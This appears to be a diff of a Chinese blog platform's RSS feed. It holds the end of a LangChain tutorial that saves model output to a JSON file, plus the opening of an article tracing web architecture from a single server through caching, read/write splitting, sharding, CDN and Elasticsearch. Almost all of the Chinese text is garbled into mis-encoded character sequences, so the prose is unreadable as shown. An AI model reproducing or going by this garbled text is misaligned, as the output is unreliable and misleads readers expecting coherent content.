+         </span>| save_json  <span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> å½æ°ç´æ¥å¥é¾</span>
+<span style="color: rgba(0, 0, 0, 1)">         )
+ 
+result </span>= chain.invoke(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">è¯·æè¿°ä¸ä¸å¼ ä¸è¿ä¸ªäººï¼åæ¬å§åãå¹´é¾ãèä¸åå´è¶£ç±å¥½ã</span><span style="color: rgba(128, 0, 0, 1)">"</span>, config=<span style="color: rgba(0, 0, 0, 1)">config)
+</span><span style="color: rgba(0, 0, 255, 1)">print</span>(result)</pre>
+</div>
+<p>è¿è¡è¿æ®µä»£ç åï¼ä½ ä¼å¨å½åç®å½ä¸çå°ä¸ä¸ªoutput.jsonæä»¶ï¼åå®¹å¦ä¸ï¼</p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 0, 1)">{
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å§å</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å¼ ä¸</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å¹´é¾</span><span style="color: rgba(128, 0, 0, 1)">"</span>: 30<span style="color: rgba(0, 0, 0, 1)">,
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">èä¸</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">è½¯ä»¶å·¥ç¨å¸</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å´è¶£ç±å¥½</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: [
+        </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">éè¯»ææ¯ä¹¦ç±</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+        </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å¾æ­¥æè¡</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+        </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">å´æ£</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">
+    ]
+}</span></pre>
+</div>
+<p>éè¦æç¤ºï¼èªå®ä¹å½æ°å¿é¡»è¿åæ°æ®ï¼è¿æ ·æ°æ®æè½ç»§ç»­ä¼ éç»é¾æ¡ä¸­çä¸ä¸ä¸ªç»ä»¶ãå¦æå½æ°æ²¡æè¿åå¼ï¼è¿åNoneï¼ï¼é£ä¹é¾æ¡çåç»­ç»ä»¶å°æ¶å°Noneä½ä¸ºè¾å¥ã</p>
+<p>&nbsp;</p>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-24 19:58">2026-05-24 19:58</span>&nbsp;
+<a href="https://www.cnblogs.com/halfcode">èéè¯´ç¼ç¨</a>&nbsp;
+éè¯»(<span id="post_view_count">0</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20143984);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fhalfcode%2Fp%2F20143984&amp;targetId=20143984&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
     <title><![CDATA[ æ´è°·-P11942 [KTSC 2025] éå¡ç©éµ é¢è§£ ]]></title>
     <link>https://www.cnblogs.com/xiaoniu142857/p/20142744</link>
     <guid>b5457680d714112ed842a9e61784e173</guid>
@@ -596,8 +814,8 @@ else
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-05-23 17:29">2026-05-23 17:28</span>&nbsp;
 <a href="https://www.cnblogs.com/shenchuanchao">ç ååå­</a>&nbsp;
-éè¯»(<span id="post_view_count">121</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
+éè¯»(<span id="post_view_count">192</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">3</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20135434);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fshenchuanchao%2Fp%2F20135434%2Fdotnet-8-web-development-part6-blazor-full-stack-no-javascript-anxiety&amp;targetId=20135434&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
@@ -1037,6 +1255,241 @@ root@network-demo:~# kubectl exec -it pods/ipvlan-pod1 -- ip neighbor show
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20135300);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fmanuscript%2Fp%2F20135300&amp;targetId=20135300&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ è¢«æµéé¼åºæ¥çæ¶æï¼ä»ä¸å°æå¡å¨å°äºåçç 17 æ¬¡èå ââ éç¾¤ãç¼å­ãMQãå¾®æå¡ãDockerãK8S çåä¸ä»ç ]]></title>
+    <link>https://www.cnblogs.com/w5942066/p/20134970</link>
+    <guid>c5cf50adcd58e28c34a848d3559e2a93</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/w5942066/p/20134970" title="åå¸äº 2026-05-23 16:13">
+    <span role="heading" aria-level="2">è¢«æµéé¼åºæ¥çæ¶æï¼ä»ä¸å°æå¡å¨å°äºåçç 17 æ¬¡èå ââ éç¾¤ãç¼å­ãMQãå¾®æå¡ãDockerãK8S çåä¸ä»ç</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<h2 id="pTitle">ãã1ãåè¨ ââ ä½ ä»¥ä¸ºç"é«å¤§ä¸"ï¼é½æ¯è¢«æµéé¼åºæ¥ç</h2>
+<p>ããããæä¸å¥è¯æç¹å«åæ¬¢ï¼<strong>æ¯ä¸å±æ¶æé½ä¸æ¯è®¾è®¡åºæ¥çï¼æ¯è¢«æµéé¼åºæ¥çã</strong></p>
+<p>ããããä½ åäºä¸ä¸ªå°ç½ç«ï¼ç¨æ·æ¢æ¢å¤äºãä¸å°æå¡å¨æä¸ä½äºï¼ä½ å äºç¬¬äºå°ãä¸¤å°æä¸ä½äºï¼ä½ å¼å§æ³"è½ä¸è½æè¯»åååå¼"ãæ°æ®åºæ¢äºï¼ä½ å äºç¼å­ãç¼å­è¿ä¸å¤ï¼ä½ æäºåºæäºè¡¨ãç³»ç»è¦åå¤ªéï¼ä½ ææäºå¾®æå¡ãå¾®æå¡å¤ªå¤äºé¨ç½²ä¸è¿æ¥äºï¼ä½ ç¨ä¸äº Docker å K8Sãæºå¨é½ä¸æ³ç®¡äºï¼ä½ è¿ä¸äºäºã</p>
+<p>ãããã<strong>æ¶ææ¼è¿æ²¡æå§æ¬ãæ¯ä¸æ­¥é½æ¯å ä¸ºä½ éå°äºä¸ä¸ªå·ä½ççç¹ï¼ç¶åæ³äºä¸ä¸ªå·ä½çåæ³å»è§£å³å®ã</strong>ä»å¤©é£äºå¬èµ·æ¥é«ä¸å¯æçè¯ââè´è½½åè¡¡ãåå¸å¼ç¼å­ãè¯»ååç¦»ãååºåè¡¨ãæ¶æ¯éåãæå¡åç°ãå®¹å¨ç¼æï¼æ¯ä¸ä¸ªé½æ¯æä¸ªç¨åºåå¨è¢«æµéæè¶´ä¸ä¹åï¼ç¬èµ·æ¥æåºæ¥çè§£å³æ¹æ¡ã</p>
+<p>ããããè¿ç¯æç« ç¨ä¸ä¸ªèæåä¸æäºä¸²èµ·æ´ä¸ªäºèç½æ¶ææ¼è¿å²ãä½ è·çæäºèµ°ä¸éï¼é£äºåè¯å°±ä¸åæ¯é¢è¯å«è¡æââ<strong>å®ä»¬æ¯ä½ äº²èªè¸©è¿çåãç¬è¿çå¤ã</strong></p>
+<p>ãããã<strong>å ä¸ªæ°å­è®©ä½ æåä¸ä¸æ¶æçè·¨åº¦</strong>ï¼CNCF 2025 å¹´æ¥åæ¾ç¤ºï¼96% çç»ç»å·²ä½¿ç¨æè¯ä¼°å®¹å¨ææ¯ï¼85% å¨çäº§ç¯å¢è¿è¡ K8SãDORA ç ç©¶æåºï¼ç²¾è±å¢éé¨ç½²é¢çæ¯ä½ç»©æå¢éç 973 åï¼åæ´å¤±è´¥çä½ 5 åãNetflix ç CQRS æ¶æä» Kafka+Cassandra æ¼è¿å°åå­æ°æ®åºï¼é¦é¡µå è½½ä» 1.4 ç§éå° 0.4 ç§ãèå¦ä¸ä¸ªåä¸å¢éå¨åªæ 6 ä¸ªå¼åæ¶å°±ä¸äºäºä»¶é©±å¨ + Kafka + CQRSï¼ç»ææ§è½é 14 åãææ¬æ¶¨ 6 åââæåä¹ä¹éåæ¨¡åååä½ã</p>
+<p>ãã<strong>æ¶æéåçç¬¬ä¸ååï¼æéæ¼è¿ï¼å«è¶åæ¶è´¹ã</strong>æä»¬å¼å§å§ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004607529-111873793.png" alt="d_00_roadmap" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã2ãåæºæ¶æ ââ ææä¼å¤§ç³»ç»çèµ·ç¹ï¼é½æ¯"ä¸å°æå¡å¨å¨æå®"</h2>
+<p>ããããåè®¾ä½ ååä¸ï¼åäºä¸ä¸ªå°çµåç½ç«ãç¨æ·ä¸å¤ï¼æ¯å¤©å ç¾ä¸ªè®¿å®¢ã</p>
+<p>ããããä½ çæ¶æç®åå°ä»¤äººåæï¼<strong>ä¸å°æå¡å¨ï¼è£äºä¸æ ·ä¸è¥¿ââåºç¨ç¨åºãæ°æ®åºãéææä»¶ã</strong>ç¨æ·è¯·æ±æ¥äºï¼åºç¨å¤çä¸å¡é»è¾ï¼å»æ°æ®åºæ¥æ°æ®ï¼è¿åé¡µé¢ãå¨é¨å¨åä¸å°æºå¨ä¸å®æã</p>
+<p>ããããä½ ç»è¿ä¸ªæ¶æèµ·äºä¸ªåå­å«<strong>"åæºæ¶æ"</strong>ãè¿æ¶åä½ è¿ä¸æä»ä¹å«"æ¶æ"ï¼ä½ åªæ¯æä¸è¥¿è·èµ·æ¥äºãç¨æ·è½ç¨ï¼ä½ å°±å¼å¿ã</p>
+<p>ããããå°å³æ¯å¤ãå¨è¿ä¸ªé¶æ®µï¼<strong>åæºæ¶ææ¯æä¼è§£</strong>ââå¼åå¿«ãé¨ç½²ç®åãææ¥é®é¢ä¸ç®äºç¶ãå¦æè¿æ¶åä½ å°±ä¸å¾®æå¡ãä¸ K8Sï¼ä½ ä¸æ¯å¨åæ¶æï¼ä½ æ¯å¨ä½æ­»ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004645665-1764528140.png" alt="d_01_monolith" loading="lazy"></p>
+<p>ãããããä½å¥½æ¯ä¸é¿ãç¨æ·å¼å§å¤äºã&nbsp;</p>
+<h2 id="pTitle">ãã3ãåºç¨ä¸æ°æ®åºåç¦» ââ ç¬¬ä¸ä¸ªåç¦»ï¼è§£å³èµæºäºå¤º</h2>
+<p>ããããç¨æ·éä¸æ¥ä¹åï¼ä½ åç°ä¸ä¸ªç¦äººçç°è±¡ï¼<strong>åºç¨åæ°æ®åºå¨æ¢èµæºã</strong></p>
+<p>ããããåºç¨ç¨åºè¦ CPUãè¦åå­æ¥åä¸å¡è®¡ç®ãæ°æ®åºè¦ç£ç IO æ¥è¯»åæ°æ®ãä¸¤ä¸ªå®¶ä¼æ¤å¨åä¸å°æºå¨ä¸ï¼äºç¸çä¸é¡ºç¼ââCPU é«äºæ°æ®åºæ¢ï¼ç£ç IO é«äºåºç¨å¡ã</p>
+<p>ããããä½ çè§£å³åæ³ç®åç²æ´ï¼<strong>åä¹°ä¸å°æºå¨ï¼æåºç¨åæ°æ®åºåå¼ã</strong>åºç¨æå¡å¨ä¸é¨å¤çä¸å¡è¯·æ±ï¼æ°æ®åºæå¡å¨ä¸é¨åæ°æ®å­åãä¸¤å°æºå¨åå¹²åçï¼äºä¸å¹²æ°ã</p>
+<p>ããããè¿çä¼¼ç®åçä¸æ­¥ï¼å¶å®æ¯æ¶ææ¼è¿å²ä¸ç¬¬ä¸ä¸ªå³é®ååçè¯çï¼<strong>å³æ³¨ç¹åç¦»ã</strong>ä¸åç±»åçå·¥ä½è´è½½ï¼åºè¯¥è·å¨ä¸åçç¡¬ä»¶ä¸ãåºç¨æ¯è®¡ç®å¯éåï¼æ°æ®åºæ¯ IO å¯éåââæå®ä»¬åå¼ï¼åèªä¼åã</p>
+<p>ããããèä¸åå¼ä¹ååºç°äºä¸ä¸ªæå¤æ¶è·ï¼åºç¨æå¡å¨æäºï¼æ°æ®åºè¿æ´»çãæ°æ®åºæäºï¼åºç¨æå¡å¨è¿è½åé¡¶çè¿ååå¥½éè¯¯é¡µé¢ã<strong>å¯ç»´æ¤æ§ä¹æåäºã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004739583-1996569988.png" alt="d_02_app_db" loading="lazy"></p>
+<p>&nbsp;</p>
+<p>ããããå¥½æ¯åä¸é¿ãç¨æ·ç»§ç»­æ¶¨ï¼<strong>åå°åºç¨æå¡å¨ä¹æä¸ä½äºã</strong></p>
+<h2 id="pTitle">ãã4ãéç¾¤ + è´è½½åè¡¡ ââ ä¸å°ä¸å¤ï¼å æºå¨ï¼</h2>
+<p>ããããä¸å°æå¡å¨ï¼å°±ç®ä½ æéç½®æå°é¡¶ï¼å®çå¤çè½åä¹æ¯æä¸éçãæ¯å¦è¯´ä¸ç§æå¤å¤ç 100 ä¸ªè¯·æ±ãçªç¶æ¥äº 500 ä¸ªè¯·æ±æä¹åï¼</p>
+<p>ããããä½ çæè·¯å¾æ´ç´ ï¼100 Ã 5 = 500ãæ¢ç¶ä¸å°åªè½æ 100ï¼<strong>é£ä¸ 5 å°ä¸æ¨¡ä¸æ ·çæå¡å¨ä¸å°±è¡äºï¼</strong>ä½ æåä¸ä»½ä»£ç é¨ç½²å° 5 å°æºå¨ä¸ï¼ä½ ç»å®ä»¬ååå«<strong>"éç¾¤"</strong>ã</p>
+<p>ããããä½æ°é®é¢é©¬ä¸æ¥äºï¼æµéæä¹ååå°åéå° 5 å°æºå¨ä¸ï¼æ»ä¸è½ç¨æ·èªå·±éå§ï¼äºæ¯ä½ åæäºä¸ä¸ªä¸­é´ç»ä»¶ï¼å®è½<strong>æè¯·æ±ååå°åéå°æ¯ä¸å°åºç¨æå¡å¨ä¸</strong>ãä½ ç»å®ååå«<strong>"è´è½½åè¡¡"</strong>ï¼Load Balancerï¼ã</p>
+<p>ããããè´è½½åè¡¡çç­ç¥æå¾å¤ï¼è½®è¯¢ï¼ä¸äººä¸æ¬¡ï¼ãæå°è¿æ¥ï¼è°é²æ¾è°ï¼ãIP Hashï¼åä¸ç¨æ·æå°åä¸å°ï¼ã</p>
+<p>ããããæäºéç¾¤ï¼ä½ æ¶è·äºä¸¤ä¸ªå³é®è½åï¼</p>
+<p>ãããã<strong>æ°´å¹³æ©å±</strong>ï¼æä¸ä½äºå°±å æºå¨ï¼èä¸æ¯æ¢æ´å¼ºçæºå¨ã1 å°å 5 å°ï¼5 å°å 10 å°ï¼çè®ºä¸å¯ä»¥æ éå ã</p>
+<p>ãããã<strong>é«å¯ç¨</strong>ï¼ä¸å°æºå¨æäºï¼è´è½½åè¡¡èªå¨ææµéåå°å¶ä»æºå¨ä¸ãç¨æ·å®å¨æ æï¼ç³»ç»ç»§ç»­è¿è½¬ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004820886-157799159.png" alt="d_03_cluster_lb" loading="lazy"></p>
+<p>ããããåºç¨å±æä½äºï¼ä½åååæ¨åæºä¸æ ·ï¼<strong>å¨é¨æ¨å°äºæ°æ®åºã</strong></p>
+<h2 id="pTitle">ãã5ãç¼å­ ââ æ¶æå²ä¸æèªæç"å·æ"</h2>
+<p>ããããå¤§éè¯·æ±ç©¿éå°æ°æ®åºï¼æ°æ®åºæäºæ°çç¶é¢ãäºæ¯ä½ å¼å§ç ç©¶ï¼<strong>åºç¨æ¯æä¹æ¥æ°æ®åºçï¼</strong></p>
+<p>ããããåºç¨åä¸ä¸ªæ¥è¯¢è¯·æ±ç»æ°æ®åºãæ°æ®åºåé¨æä¸ä¸ª<strong>ç¼å²åº</strong>ââåææ°æ®å è½½å°åå­éï¼å¨åå­éæ¾ãæ¾å°äºç´æ¥è¿åï¼æ²¡æ¾å°å°±å»ç£çæ¾ï¼æ¾å°åæ¾è¿ç¼å²åºï¼åè¿åç»åºç¨ã</p>
+<p>ããããä½ åç°äºä¸ä¸ªå³é®äºå®ï¼<strong>ä»åå­ç¼å²åºè¯»æ°æ®ï¼æ¯ä»ç£çè¯»è¦å¿« 1000 åä»¥ä¸ã</strong></p>
+<p>ããããé£ä½ å¯è½ä¼æ³ï¼è½ä¸è½ææææ°æ®é½æ¾ç¼å²åºï¼ä¸è¡ï¼ç¼å²åºå¤ªå°äºï¼è·ä½ çææºåå­ä¸æ ·å°ï¼æ ¹æ¬ä¸å¤ç¨ã</p>
+<p>ããããäºæ¯ä½ çµæºä¸å¨ï¼<strong>æç´æ¥æç¼å²åºåç¬æåºæ¥ï¼æ¾å°ä¸å°ç¬ç«çæå¡å¨ä¸ï¼ç»å®éå¤§åå­ï¼</strong>é£äºè¢«é¢ç¹è®¿é®ç"ç­æ°æ®"ï¼å¨é¨æ¾å°è¿ä¸ªç¬ç«çå¤§ç¼å²åºéãåºç¨åæ¥è¿éæ¾ï¼æ¾ä¸å°åå»æ°æ®åºã</p>
+<p>ããããä½ ç»å®ååå«<strong>"ç¼å­"</strong>ãèä¸ä½ ä¸åªæäºä¸å±ï¼ä½ æäº<strong>ä¸å±ç¼å­</strong>ï¼</p>
+<p>ãããã<strong>æµè§å¨ç¼å­</strong>ââéæèµæºç´æ¥ç¨æµè§å¨æ¬å°ç¼å­ï¼è¿ç½ç»è¯·æ±é½çäºã</p>
+<p>ãããã<strong>æ¬å°ç¼å­</strong>ââåºç¨æå¡å¨èªå·±çåå­éä¹ç¼å­ä¸ä»½ï¼è¿ç½ç»è¯·æ±å°ç¼å­æå¡å¨é½çäºã</p>
+<p>ãããã<strong>åå¸å¼ç¼å­ï¼Redisï¼</strong>ââå±äº«çç¼å­éç¾¤ï¼ææåºç¨æå¡å¨å±ç¨ï¼å­æç­çæ°æ®ã</p>
+<p>ããããæ¥è¯¢æµç¨åæï¼æµè§å¨ç¼å­ â æ¬å°ç¼å­ â åå¸å¼ç¼å­ â æ°æ®åºãç»å¤§å¤æ°è¯·æ±å¨ç¼å­å±å°±è¢«æ¦æªäºï¼<strong>æ ¹æ¬å°ä¸äºæ°æ®åºã</strong>æ°æ®åºååæ´è·ãå³ä½¿æ°æ®åºæäºï¼ç¼å­è¿è½é¡¶ä¸éµå­ã</p>
+<p>ããããç¼å­ä¸åªå­æ°æ®åºçæ¥è¯¢ç»æï¼<strong>è¿å­é¡µé¢çæ®µãæ¥å£ç»æãè®¡ç®ç»æâ¦â¦ä¸åè½æé«è®¿é®æççä¸è¥¿ï¼å¨é½å¾ç¼å­éå¡ã</strong>ä½ ç¨ç©ºé´æ¢æ¶é´ï¼ç¨åå­æ¢éåº¦ãè¿æ¯æ¶ææ¼è¿å²ä¸çç¬¬ä¸ä¸ªé»éæ³åã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004856067-1870522125.png" alt="d_04_cache" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã6ãè¯»ååç¦» ââ æ°æ®åºçåå·¥</h2>
+<p>ããããç¼å­è§£å³äº"ç­æ°æ®"çæ¥è¯¢ååï¼ä½<strong>éç­ç¹æ°æ®çæ¥è¯¢åææåæä½</strong>è¿æ¯è¦æå°æ°æ®åºãèä¸æ°æ®åºæä¸ä¸ªç¹ç¹ï¼<strong>åæä½å¹¶ä¸æ¢ï¼ä½åæä½ä¼å éï¼è¡éãè¡¨éï¼ï¼éä¸å¤ï¼è¯»æä½å°±å¾æéç­ã</strong></p>
+<p>ããããä½ è§å¯å°ï¼ç°å®ä¸­çäºèç½ç³»ç»ï¼<strong>è¯»å¤åå°ã</strong>ç¨æ·æµè§åå 100 æ¬¡ï¼æä¸å 1 æ¬¡ãé£è½ä¸è½ç»æ°æ®åºä¹åä¸ªå·¥å¢ï¼</p>
+<p>ããããäºæ¯ä½ è®¾è®¡äºä¸å¥æ¹æ¡ï¼<strong>ä¸ä¸ªä¸»åºä¸é¨è´è´£åï¼å¤ä¸ªä»åºä¸é¨è´è´£è¯»ã</strong>ä¸»åºçæ°æ®éè¿æ°æ®åºåæ­¥æºå¶ï¼å¦ SQL Server Always OnãMySQL binlog åæ­¥ï¼å¤å¶å°ä»åºï¼ä¿è¯ä¸»ä»æ°æ®ä¸è´æ§ã</p>
+<p>ããããä½ ç»è¿ä¸ªæ¹æ¡ååå«<strong>"è¯»ååç¦»"</strong>ãä¸ä¸ªä¸»åº + å¤ä¸ªä»åºï¼è¯»ååè¢«åæå°äºå¤å°ä»åºä¸ï¼æ°æ®è¯»åäºç¸é»å¡çé®é¢å½»åºè§£å³äºãæ¯ä¸ªæ°æ®åºç³»ç»æèªå·±çä¸»ä»å¤å¶æºå¶ãSQL Server ç¨ Always On å¯ç¨æ§ç»ï¼MySQL ç¨ binlog åæ­¥ãå®ä»¬åèªä¸»ä»å¤å¶<strong>ã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523004937395-911139882.png" alt="d_05_readwrite" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã7ãååºåè¡¨ ââ å½æ°æ®åºå¤§å°ä¸å¼ è¡¨è£ä¸ä¸</h2>
+<p>ããããç³»ç»è·äºå å¹´ï¼æ°æ®éè¶æ¥è¶å¤§ãè®¢åè¡¨å åä¸è¡ï¼æ¥å¿è¡¨ä¸äº¿è¡ã<strong>ååºåè¡¨å¨é¨æçäºã</strong></p>
+<p>ããããè¿æ¶åä½ å¯¹æ°æ®åºå¨äºç¬¬äºåï¼</p>
+<p>ãããã<strong>åç´ååº</strong>ï¼æç§ä¸å¡è¾¹çï¼æä¸åçè¡¨æå°ä¸åçåºéãç¨æ·ç¸å³çè¡¨æ¾ç¨æ·åºï¼ååç¸å³çæ¾åååºï¼è®¢åç¸å³çæ¾è®¢ååºãååºä¹é´äºä¸å¹²æ°ãå¥½å¤æ¯ï¼æ¯ä¸ªåºå¯ä»¥ç¬ç«æ©ç¼©å®¹ï¼ä¸ä¼å ä¸ºä¸ä¸ªä¸å¡çæ´æ¶¨æå®å¨å±ã</p>
+<p>ãããã<strong>æ°´å¹³åè¡¨</strong>ï¼ä¸å¼ å¤§è¡¨ææå¤å¼ ç»æç¸åçå°è¡¨ãæ¯å¦è®¢åè¡¨ï¼æç¨æ· ID åå¸åæ¨¡ï¼æ UID % 16 çç»æåæ£å° 16 å¼ è¡¨ä¸­ãéåæ°æ®åºä¸­é´ä»¶ï¼å¦ ShardingSphereï¼ï¼å¯¹åºç¨å±å®å¨éæââä½ åçè¿æ¯ SELECT * FROM ordersï¼ä¸­é´ä»¶å¸®ä½ æ SQL è·¯ç±å°æ­£ç¡®çåè¡¨ã</p>
+<p>ããããå°è¿ä¸æ­¥ï¼æ°æ®åºä»åæ¥çåç¹åæäº<strong>ä¸ä¸ªå¯åçãå¯æ©å±çåå¸å¼å­å¨å±ã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005000624-168322620.png" alt="d_06_sharding" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã8ãCDN + ååä»£ç ââ ææ°æ®"æåæ¾å°ç¨æ·èº«è¾¹"</h2>
+<p>ããããä½ çç¨æ·éå¸å¨å½ãå¹¿ä¸ç¨æ·è®¿é®å¿«å¦éªçµï¼ä¸åç¨æ·è®¿é®æ¢å¾åçè½¦ãåå å¾ç®åï¼<strong>ç©çè·ç¦»å³å®ç½ç»å»¶è¿ã</strong>èä¸åºç¨æå¡å¨ç´æ¥æ´é²å¨å¬ç½ä¸ï¼å¤ªå±é©äºï¼éæ¶å¯è½è¢«æ»å»ã</p>
+<p>ããããäºæ¯ä½ ååæäºä¸¤ä¸ªæ°ä¸è¥¿ï¼</p>
+<p>ãããã<strong>CDNï¼åå®¹ååç½ç»ï¼</strong>ï¼å¨å¨å½å¸äºå¾å¤èç¹ï¼æéæèµæºï¼å¾çãCSSãJSãè§é¢ï¼æåæ¨éå°ç¦»ç¨æ·æè¿çèç¹ä¸ãç¨æ·è®¿é®æ¶ï¼DNS è§£æå°æè¿ç CDN èç¹ï¼ç´æ¥å°±è¿åæ°æ®ãåäº¬ç¨æ·ä¸ç¨è·å°æ·±å³æºæ¿ââéåº¦ä»ç§çº§åææ¯«ç§çº§ã</p>
+<p>ãããã<strong>ååä»£çï¼Nginxï¼</strong>ï¼æ¾å¨ç¨æ·ååºç¨æå¡å¨ä¹é´ï¼å¬ç½è¯·æ±åå°ååä»£çï¼åç±å®è½¬åç»åç½çåºç¨æå¡å¨ãååä»£çéèäºçå®æå¡å¨å°åï¼é²æ­¢ç´æ¥æ»å»ãå®è¿è½å SSL ç»ç»ãæµéæ¸æ´ãå®å¨æ ¡éªââ<strong>ä¸ä¸ªç»ä»¶å¹²å¤ä¸ªæ´»ã</strong></p>
+<p>ããããCDN è´è´£"è®©æ°æ®ç¦»ç¨æ·æ´è¿"ï¼ååä»£çè´è´£"è®©æå¡å¨ç¦»æ»å»æ´è¿"ã<strong>ä¸è¿ä¸è¿ï¼ä¸ä¸ªå éä¸ä¸ªæ¤ç¾ã</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005016043-920310517.png" alt="d_07_cdn_proxy" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã9ãæç´¢å¼æ + Elasticsearch ââ æ°æ®åºä¸æ¯ä¸è½ç</h2>
+<p>ããããä¸å¡è¶æ¥è¶å¤æãç¨æ·è¦æååââæ¨¡ç³æç´¢ãå³é®è¯é«äº®ãæ¼é³çº éãè¿è¥è¦çæ¥è¡¨ââå¤ç»´ç»è®¡ãèååæãæ¶é´èå´æ¥è¯¢ã</p>
+<p>ããããä½ ç¨ä¼ ç»æ°æ®åºç LIKE å»æï¼ç¨æ·è¾å¥"è¹æææº"ï¼æ°æ®åºå¨è¡¨æ«æï¼ç­äº 5 ç§æåºç»æââç¨æ·æ©è·äºã</p>
+<p>ããããäºæ¯ä½ åæäºä¸¤ä¸ªæ°ä¸è¥¿ï¼</p>
+<p>ãããã<strong>æç´¢å¼æï¼Elasticsearchï¼</strong>ï¼åºäºåæç´¢å¼ï¼æç´¢æ¯«ç§çº§ååºãç¨æ·æ"è¹æææº"ï¼ES å¨åæç´¢å¼éç¬é´å®ä½å°åå«"è¹æ"å"ææº"çææ¡£ï¼è¿åç»æãæ¯æåè¯ãé«äº®ãç¸å³åº¦æåºãæ¼é³çº éãä½ ç»å®ååå«<strong>"æç´¢å¼æ"</strong>ã</p>
+<p>ãããã<strong>NoSQLï¼MongoDB / HBaseï¼</strong>ï¼ä¸é¨å­é£äºç»æä¸åºå®ãéå¤§ä½æ¥è¯¢æ¨¡å¼ç®åçæ°æ®ââæ¥å¿ãç¨æ·è¡ä¸ºãåç¹æ°æ®ãæ¯æé«å¹¶ååå¥åæ°´å¹³æ©å±ã</p>
+<p>ããããè³æ­¤ï¼ä½ çæ°æ®å±ä»åä¸çå³ç³»åæ°æ®åºï¼åæäº<strong>å¤å¼æåä½çæ°æ®å¹³å°</strong>ï¼SQL Server/MySQL è´è´£æ ¸å¿ä¸å¡æ°æ®ï¼Elasticsearch è´è´£æç´¢ï¼MongoDB è´è´£æ¥å¿åéç»æåæ°æ®ï¼Redis è´è´£ç¼å­ãæ¯ä¸ªå¼æå¹²èªå·±ææé¿çæ´»ã</p>
+<p><img src="https://img2024.cnblogs.com/blog/787521/202605/787521-20260523005033166-1531244723.png" alt="d_08_search_es" loading="lazy"></p>
+<p>&nbsp;</p>
+<h2 id="pTitle">ãã10ãåå¸å¼æ¶æ + æå¡æå ââ ä»ä¸å¨å°ä¸ç¾¤</h2>
+<p>ããããä¸å¡è¶åè¶å¤§ãä½ çç½ç«ä»ä¸ä¸ªç®åçµåï¼åæäº<strong>éç¨æ·ãååãè®¢åãæ¯ä»ãç©æµãå®¢æäºä¸ä½çå¤§å¹³å°ã</strong></p>
